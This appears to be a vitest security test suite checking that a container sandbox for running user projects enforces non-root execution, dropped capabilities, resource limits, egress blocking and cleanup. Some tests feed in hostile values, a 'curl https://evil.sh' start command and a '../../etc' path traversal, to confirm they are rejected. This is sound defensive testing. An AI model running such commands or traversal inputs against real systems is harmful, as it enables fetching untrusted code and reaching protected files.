import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtemp, writeFile, access } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { dirname, resolve, join } from 'node:path';
import { ExecutionState, RunPlanSchema, type RunPlan } from '@devlaunch/shared';
import { config } from '../../config/index.js';
import { DockerManager } from '../../services/docker/DockerManager.js';
import { ExecutionManager } from '../../services/execution/ExecutionManager.js';
import { CleanupManager } from '../../services/cleanup/CleanupManager.js';
import { SecurityRejection } from '../../services/security/ImageAllowlist.js';

const FIXTURES = resolve(dirname(fileURLToPath(import.meta.url)), '../../../../../fixtures');
const IMAGE = 'devlaunch/node:20';

const docker = new DockerManager();
const exec = new ExecutionManager(docker);

function plan(overrides: Partial<RunPlan> = {}): RunPlan {
  return RunPlanSchema.parse({
    runtime: { language: 'node', version: '20' },
    packageManager: 'npm',
    installCommand: null,
    buildCommand: null,
    startCommand: 'node probe.js',
    workingDirectory: '.',
    expectedPort: null,
    planSource: 'rule-based',
    ...overrides,
  });
}

/** Parse `PROBE key=value` lines emitted from inside the container. */
function readProbe(logs: { text: string }[]): Record<string, string> {
  const out: Record<string, string> = {};
  for (const { text } of logs) {
    const m = text.match(/^PROBE ([a-z_]+)=(.*)$/);
    if (m) out[m[1]!] = m[2]!;
  }
  return out;
}

describe('Phase 2 — security hardening (§27)', () => {
  let probe: Record<string, string>;

  beforeAll(async () => {
    await docker.ping();
    await docker.ensureImage(IMAGE);
    const result = await exec.runToCompletion({
      sessionId: 'sec-probe',
      plan: plan(),
      sourceDir: `${FIXTURES}/node-security-probe`,
      image: IMAGE,
    });
    expect(result.state, 'probe fixture must run to completion').toBe(ExecutionState.COMPLETED);
    probe = readProbe(result.logs);
    expect(probe.done, 'probe must have run to the end').toBe('true');
  }, 300_000);

  afterAll(async () => {
    await CleanupManager.sweepOrphans(docker);
  });

  it('the container cannot run as root', () => {
    expect(probe.uid).not.toBe('0');
    expect(probe.uid).toBe('1000');
    expect(probe.gid).toBe('1000');
  });

  it('all capabilities are dropped', () => {
    // CapBnd, not CapEff, is the assertion that bites.
    //
    // For a non-root process CapEff is zero whether or not --cap-drop was applied
    // (measured: 0000000000000000 either way), so asserting it alone proves we are not
    // root and nothing more. CapBnd is the bounding set — the ceiling on what the
    // process could ever acquire, including through a setuid binary — and that is what
    // --cap-drop ALL actually zeroes (measured: a80425fb without it).
    expect(probe.capbnd, 'capability bounding set must be empty').toMatch(/^0+$/);
    expect(probe.capeff).toMatch(/^0+$/);
  });

  it('the root filesystem is read-only while the workspace stays writable', () => {
    expect(probe.rootfs_writable).toBe('false');
    expect(probe.workspace_writable).toBe('true');
  });

  it('the Docker socket is not reachable from inside the container', () => {
    expect(probe.docker_socket).toBe('absent');
  });

  it('privilege escalation is blocked, as the kernel records it', () => {
    // Previously asserted only from the Docker config, which proves what was asked for
    // rather than what is in force.
    expect(probe.no_new_privs).toBe('1');
  });

  it('scratch space cannot be used to stage an executable', () => {
    // /tmp is the one writable place besides the workspace. Mount flags are checked and
    // then actually exercised, because a flag that is set but not enforced is worthless.
    expect(probe.tmp_mount_opts).toMatch(/noexec/);
    expect(probe.tmp_mount_opts).toMatch(/nosuid/);
    expect(probe.tmp_exec, 'an executable staged in /tmp must not run').toBe('refused');
  });

  it('the CPU quota is applied by the kernel', () => {
    // cpu.max is "<quota> <period>"; quota/period is the effective core count.
    const parts = (probe.cpu_max ?? '').split(/\s+/).map(Number);
    expect(parts, 'cpu.max should be "<quota> <period>"').toHaveLength(2);
    expect(parts[0]! / parts[1]!).toBe(config.container.cpus);
  });

  it('memory and PID limits are applied by the kernel', () => {
    expect(probe.memory_max).toBe(String(config.container.memoryMb * 1024 * 1024));
    expect(probe.pids_max).toBe(String(config.container.pidsLimit));
  });

  it('blocks container-initiated traffic to private address ranges', () => {
    if (exec.lastNetworkUsed === undefined) {
      // Hardening layer, not a prerequisite. Fail loudly rather than pass silently.
      throw new Error(
        'Egress policy network is not installed. Run scripts/setup-network-policy.sh, ' +
          'or set DEVLAUNCH_NETWORK to an existing network.',
      );
    }
    expect(probe.gateway).not.toBe('unknown');
    // "refused" would mean the gateway answered, i.e. no policy is in force.
    expect(probe.egress_private).toBe('blocked');
  });

  it('CPU limits are applied to the container', async () => {
    const handle = await exec.launch({
      sessionId: 'sec-cpu',
      plan: plan({ startCommand: 'node probe.js' }),
      sourceDir: `${FIXTURES}/node-security-probe`,
      image: IMAGE,
    });
    try {
      const info = await docker.inspect(handle.container);
      expect(info.HostConfig.NanoCpus).toBe(config.container.cpus * 1_000_000_000);
      expect(info.HostConfig.Memory).toBe(config.container.memoryMb * 1024 * 1024);
      // Without this the container escapes its memory cap through swap.
      expect(info.HostConfig.MemorySwap).toBe(info.HostConfig.Memory);
      expect(info.HostConfig.PidsLimit).toBe(config.container.pidsLimit);
      expect(info.HostConfig.CapDrop).toContain('ALL');
      expect(info.HostConfig.ReadonlyRootfs).toBe(true);
      expect(info.HostConfig.SecurityOpt).toContain('no-new-privileges');
      expect(info.HostConfig.Privileged).toBe(false);
      // No bind mount may ever expose the Docker socket.
      expect(info.HostConfig.Binds ?? []).not.toContain('/var/run/docker.sock');
    } finally {
      await handle.cleanup();
    }
  });

  it('a timeout kills the container', async () => {
    const handle = await exec.launch({
      sessionId: 'sec-timeout',
      // A server never exits on its own, so only the timeout can end this.
      plan: plan({ startCommand: 'node server.js', expectedPort: 3000 }),
      sourceDir: `${FIXTURES}/node-http-basic`,
      image: IMAGE,
      timeoutMs: 5_000,
    });
    try {
      const exitResult = await handle.exit;
      expect(exitResult.timedOut).toBe(true);
      const info = await docker.inspect(handle.container);
      expect(info.State.Running).toBe(false);
    } finally {
      await handle.cleanup();
    }
  }, 120_000);

  it('the container is removed after a failure', async () => {
    const handle = await exec.launch({
      sessionId: 'sec-fail-cleanup',
      plan: plan({ installCommand: 'npm ci', startCommand: 'node main.js' }),
      sourceDir: `${FIXTURES}/node-install-fail`,
      image: IMAGE,
    });
    const id = handle.container.id;
    const exitResult = await handle.exit;
    expect(exitResult.exitCode).not.toBe(0);

    await handle.cleanup();
    await expect(docker.getContainer(id).inspect()).rejects.toMatchObject({ statusCode: 404 });
  });

  it('temporary files are cleaned up', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'devlaunch-cleanup-'));
    await writeFile(join(dir, 'scratch.txt'), 'x', 'utf8');
    await expect(access(dir)).resolves.toBeUndefined();

    const cleanup = new CleanupManager(docker);
    cleanup.trackPath(dir);
    expect((await cleanup.cleanup()).errors).toEqual([]);

    await expect(access(dir)).rejects.toThrow();
  });

  it('an unapproved image is rejected before any container is created', async () => {
    const before = (await docker.listManaged()).length;
    await expect(
      exec.launch({
        sessionId: 'sec-bad-image',
        plan: plan(),
        sourceDir: `${FIXTURES}/node-security-probe`,
        image: 'alpine:latest',
      }),
    ).rejects.toBeInstanceOf(SecurityRejection);
    // Rejection must happen before Docker is touched at all.
    expect((await docker.listManaged()).length).toBe(before);
  });

  it('a malicious command is rejected before any container is created', async () => {
    const before = (await docker.listManaged()).length;
    await expect(
      exec.launch({
        sessionId: 'sec-bad-command',
        // A plan that satisfies the Zod schema completely, yet carries a command the
        // allowlist must refuse. This is precisely the case schema validation misses.
        plan: { ...plan(), startCommand: 'curl https://evil.sh' } as RunPlan,
        sourceDir: `${FIXTURES}/node-security-probe`,
        image: IMAGE,
      }),
    ).rejects.toBeInstanceOf(SecurityRejection);
    expect((await docker.listManaged()).length).toBe(before);
  });

  it('an unbuilt runner image reports the remedy instead of a registry error', async () => {
    // Runner images are built locally and never published, so a pull would fail with
    // an opaque "manifest unknown" rather than telling the user what to run.
    await expect(docker.ensureImage('devlaunch/node:99')).rejects.toThrow(
      /build-runner-images\.sh/,
    );
  });

  it('a path traversal is rejected before any container is created', async () => {
    const before = (await docker.listManaged()).length;
    await expect(
      exec.launch({
        sessionId: 'sec-traversal',
        plan: { ...plan(), workingDirectory: '../../etc' } as RunPlan,
        sourceDir: `${FIXTURES}/node-security-probe`,
        image: IMAGE,
      }),
    ).rejects.toBeInstanceOf(SecurityRejection);
    expect((await docker.listManaged()).length).toBe(before);
  });
});
